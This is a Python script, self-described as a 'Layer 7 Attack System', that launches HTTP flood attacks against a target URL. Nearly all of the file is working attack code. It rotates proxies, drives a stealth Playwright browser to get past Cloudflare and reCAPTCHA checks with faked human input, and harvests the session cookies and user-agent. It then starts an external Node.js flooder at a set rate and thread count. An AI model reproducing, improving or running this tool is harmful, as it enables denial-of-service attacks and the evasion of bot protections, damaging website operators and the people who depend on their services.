#!/usr/bin/env python3
import asyncio
import json
import sys
import subprocess
import psutil
import time
from playwright.async_api import async_playwright
import random
import signal
import os
import aiohttp
from typing import List, Optional

class Layer7AssaultSystem:
    def __init__(self, target_url, proxy_file="proxy.txt"):
        self.target_url = target_url if target_url.startswith(('http://', 'https://')) else f'http://{target_url}'
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.current_proxy = None
        self.cookies = None
        self.user_agent = None
        self.browser_process = None
        self.node_processes = []
        self.running = True
        
        signal.signal(signal.SIGINT, self.cleanup)
        signal.signal(signal.SIGTERM, self.cleanup)
    
    def load_proxies(self) -> List[str]:
        proxies = []
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.append(line.strip())
        else:
            print(f"[!] Proxy file {self.proxy_file} not found, proceeding without proxies")
        
        print(f"[+] Loaded {len(proxies)} proxies from {self.proxy_file}")
        return proxies
    
    def get_random_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def format_proxy_for_playwright(self, proxy_str: str) -> dict:
        if not proxy_str:
            return None
        ip, port = proxy_str.split(':', 1)
        return {
            'server': f'http://{ip}:{port}',
            'username': '',
            'password': ''
        }
    
    async def test_proxy(self, proxy_str: str) -> bool:
        try:
            ip, port = proxy_str.split(':', 1)
            proxy_url = f'http://{ip}:{port}'
            
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(
                    'http://httpbin.org/ip',
                    proxy=proxy_url,
                    timeout=timeout
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        print(f"[+] Proxy {proxy_str} is working (IP: {data.get('origin')})")
                        return True
        except Exception as e:
            pass
        return False
    
    async def find_working_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        print(f"[*] Testing {min(5, len(self.proxies))} random proxies...")
        tested_proxies = random.sample(self.proxies, min(5, len(self.proxies)))
        
        for proxy in tested_proxies:
            if await self.test_proxy(proxy):
                return proxy
        
        print("[!] No working proxies found, using random proxy anyway")
        return random.choice(self.proxies) if self.proxies else None
    
    async def bypass_protections(self):
        print(f"[1] Launching browser to bypass protections for {self.target_url}")
        
        self.current_proxy = await self.find_working_proxy()
        proxy_config = self.format_proxy_for_playwright(self.current_proxy) if self.current_proxy else None
        
        async with async_playwright() as p:
            launch_args = {
                'headless': False,
                'args': [
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-site-isolation-trials',
                    f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36',
                    '--no-sandbox',
                    '--disable-dev-shm-usage'
                ]
            }
            
            if proxy_config:
                launch_args['proxy'] = proxy_config
                print(f"[+] Using proxy: {self.current_proxy}")
            
            self.browser_process = await p.chromium.launch(**launch_args)
            
            context_args = {
                'viewport': {'width': 1920, 'height': 1080},
                'user_agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36',
                'java_script_enabled': True,
                'ignore_https_errors': True
            }
            
            if proxy_config:
                context_args['proxy'] = proxy_config
            
            context = await self.browser_process.new_context(**context_args)
            
            page = await context.new_page()
            
            try:
                await page.goto(self.target_url, wait_until='networkidle', timeout=60000)
            except Exception as e:
                print(f"[!] Navigation failed: {e}")
                await page.goto(self.target_url, wait_until='domcontentloaded', timeout=30000)
            
            await page.wait_for_timeout(5000)
            
            human_patterns = [
                lambda: page.mouse.move(random.randint(100, 500), random.randint(100, 500)),
                lambda: page.keyboard.press('Tab'),
                lambda: page.evaluate('window.scrollBy(0, 300)'),
                lambda: page.mouse.click(random.randint(100, 500), random.randint(100, 500)),
                lambda: page.keyboard.type(' ', delay=random.randint(50, 200)),
                lambda: page.evaluate('window.scrollBy(0, -150)')
            ]
            
            for pattern in random.sample(human_patterns, 4):
                try:
                    await pattern()
                    await page.wait_for_timeout(random.randint(800, 2000))
                except:
                    pass
            
            content = await page.content()
            if 'cloudflare' in content.lower() or 'recaptcha' in content.lower() or 'cf-browser-verification' in content:
                print("[2] Detected protection system, attempting bypass...")
                
                await page.wait_for_timeout(3000)
                
                try:
                    await page.wait_for_selector('iframe[src*="recaptcha"]', timeout=10000, state='attached')
                    recaptcha_frames = [f for f in page.frames if 'recaptcha' in f.url.lower()]
                    
                    if recaptcha_frames:
                        recaptcha_frame = recaptcha_frames[0]
                        checkbox = await recaptcha_frame.query_selector('.recaptcha-checkbox-border')
                        if checkbox:
                            await checkbox.click()
                            print("[3] Clicked reCAPTCHA checkbox")
                            await page.wait_for_timeout(3000)
                            
                            audio_button = await recaptcha_frame.query_selector('#recaptcha-audio-button')
                            if audio_button:
                                await audio_button.click()
                                await page.wait_for_timeout(2000)
                                
                                await page.evaluate('''() => {
                                    const clickAnyButton = () => {
                                        const buttons = document.querySelectorAll('button, div[role="button"], a');
                                        buttons.forEach(btn => {
                                            if(btn.textContent.includes('Skip') || 
                                               btn.textContent.includes('Verify') ||
                                               btn.textContent.includes('Confirm')) {
                                                btn.click();
                                            }
                                        });
                                    };
                                    clickAnyButton();
                                    setTimeout(clickAnyButton, 1000);
                                }''')
                
                except Exception as e:
                    print(f"[!] reCAPTCHA handling failed: {e}")
                    print("[*] Trying alternative bypass methods...")
                    
                    await page.wait_for_timeout(5000)
                    
                    try:
                        await page.evaluate('''() => {
                            document.querySelectorAll('form').forEach(form => {
                                form.submit();
                            });
                        }''')
                        await page.wait_for_timeout(2000)
                    except:
                        pass
            
            await page.wait_for_timeout(3000)
            
            cookies = await context.cookies()
            self.cookies = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
            self.user_agent = await page.evaluate('() => navigator.userAgent')
            
            print(f"[4] Successfully obtained credentials")
            print(f"    Cookies: {self.cookies[:80]}...")
            print(f"    User-Agent: {self.user_agent[:80]}...")
            
            await context.close()
            await self.browser_process.close()
            
            return True
    
    def monitor_resources(self):
        print("[5] Starting resource monitor...")
        while self.running:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            network = psutil.net_io_counters()
            
            print(f"    CPU: {cpu_percent:5.1f}% | RAM: {memory.percent:3.0f}% | NET: ↓{network.bytes_recv//1024}KB ↑{network.bytes_sent//1024}KB | Threads: {len(self.node_processes)}")
            
            if cpu_percent > 85:
                print("    ⚠️  CPU usage critical! Consider reducing attack rate")
            if memory.percent > 90:
                print("    ⚠️  Memory critical! Some processes may be terminated")
            
            time.sleep(2)
    
    def create_proxy_list_for_node(self) -> str:
        if not self.proxies:
            return "none"
        
        proxy_file = "active_proxies.txt"
        with open(proxy_file, 'w') as f:
            for proxy in self.proxies[:100]:
                f.write(f"{proxy}\n")
        
        return proxy_file
    
    def launch_flooder(self, time_sec=60, rate=100, threads=10):
        proxy_arg = self.create_proxy_list_for_node()
        
        cmd = [
            'node', 'flooder.js',
            self.target_url,
            str(time_sec),
            str(rate),
            str(threads),
            proxy_arg,
            self.cookies,
            self.user_agent
        ]
        
        print(f"[6] Launching Node.js flooder with {threads} threads at {rate} req/sec")
        print(f"    Using proxy list: {proxy_arg}")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        self.node_processes.append(process)
        
        def output_reader(proc):
            for line in iter(proc.stdout.readline, ''):
                if line.strip():
                    print(f"    [NODE] {line.strip()}")
        
        import threading
        thread = threading.Thread(target=output_reader, args=(process,))
        thread.daemon = True
        thread.start()
        
        return process
    
    def cleanup(self, signum=None, frame=None):
        print("\n[!] Cleaning up processes...")
        self.running = False
        
        for process in self.node_processes:
            try:
                parent = psutil.Process(process.pid)
                children = parent.children(recursive=True)
                for child in children:
                    child.terminate()
                parent.terminate()
            except:
                pass
        
        if self.browser_process:
            try:
                self.browser_process.terminate()
            except:
                pass
        
        if os.path.exists("active_proxies.txt"):
            try:
                os.remove("active_proxies.txt")
            except:
                pass
        
        print("[!] All processes terminated")
        sys.exit(0)
    
    async def run(self, duration=60, rate=100, threads=10):
        try:
            print(f"[*] Target: {self.target_url}")
            print(f"[*] Duration: {duration}s | Rate: {rate}/s | Threads: {threads}")
            print(f"[*] Proxies available: {len(self.proxies)}")
            
            success = await self.bypass_protections()
            if not success:
                print("[!] Failed to bypass protections")
                return
            
            import threading
            monitor_thread = threading.Thread(target=self.monitor_resources)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            self.launch_flooder(duration, rate, threads)
            
            print(f"[7] Attack running for {duration} seconds")
            print(f"[*] Press Ctrl+C to stop early")
            
            time.sleep(duration)
            
            self.cleanup()
            
        except Exception as e:
            print(f"Error: {e}")
            self.cleanup()

def main():
    if len(sys.argv) < 2:
        print("Layer 7 Attack System with Proxy Support")
        print("Usage: python browser.py <target_url> [duration] [rate] [threads] [proxy_file]")
        print("Example: python browser.py https://example.com 60 1000 20 proxy.txt")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    rate = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    proxy_file = sys.argv[5] if len(sys.argv) > 5 else "proxy.txt"
    
    system = Layer7AssaultSystem(target, proxy_file)
    
    try:
        asyncio.run(system.run(duration, rate, threads))
    except KeyboardInterrupt:
        system.cleanup()

if __name__ == "__main__":
    main()
